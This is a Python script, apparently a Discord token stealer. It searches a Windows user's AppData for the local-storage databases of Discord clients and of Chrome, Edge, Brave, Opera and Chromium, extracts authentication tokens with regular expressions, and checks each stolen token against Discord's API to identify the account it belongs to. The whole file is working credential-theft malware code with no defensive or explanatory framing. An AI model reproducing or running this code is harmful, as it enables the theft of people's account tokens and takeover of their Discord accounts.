import os
import re
import json
import requests

AppData = os.environ["USERPROFILE"] + "\\AppData"

def getPaths():
    app_paths = [
        AppData + "\\Roaming\\discord\\",
        AppData + "\\Roaming\\discordcanary\\",
        AppData + "\\Roaming\\discordptb\\"
    ]

    browser_paths = [
        AppData + "\\Local\\BraveSoftware\\Brave-Browser\\User Data\\",
        AppData + "\\Local\\Microsoft\\Edge\\User Data\\",
        AppData + "\\Roaming\\Opera Software\\",
        AppData + "\\Local\\Google\\Chrome\\User Data\\",
        AppData + "\\Local\\Chromium\\User Data\\",
        AppData + "\\Local\\Google\\Chrome Beta\\User Data\\",
        AppData + "\\Local\\Google\\Chrome SxS\\User Data\\",
        AppData + "\\Local\\Google\\Chrome Dev\\User Data\\"
    ]

    paths = []

    for path in app_paths:
        p = path + "Local Storage\\leveldb\\"
        if os.path.exists(p):
            paths.append(p)

    for path in browser_paths:
        if not os.path.exists(path):
            continue
        
        for d in os.listdir(path):
            p = path + d + "\\Local Storage\\leveldb\\"
            if os.path.exists(p):
                paths.append(p)

    return paths

def getTokens(paths):
    tokens = []

    for path in paths:
        for file in os.listdir(path):
            if not file.endswith(".log") and not file.endswith(".ldb"):
                continue
            
            lines = open(path + file, "r", encoding="utf-8", errors="ignore").readlines()

            for line in lines:
                 for reg in [r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}']:
                    for token in re.findall(reg, line):            
                        tokens.append(token)

    return tokens

def indenifyTokens(tokens):
    indentified = {}

    for token in tokens:
        r = requests.get("https://discord.com/api/v9/users/@me", headers={ 'Authorization': token })
        if r.status_code == 200:
            user = json.loads(r.text)
            user.update({ 
                "token": token 
            })
            
            indentified[user["username"] + "#" + user["discriminator"]] = user

    return indentified



def getAllData():
    paths = getPaths()

    if len(paths) == 0:
        return {
            "all_tokens": [],
            "users": []
        }

    tokens = getTokens(paths)
    users = indenifyTokens(tokens)
    
    return {
        "all_tokens": tokens,
        "users": users
    }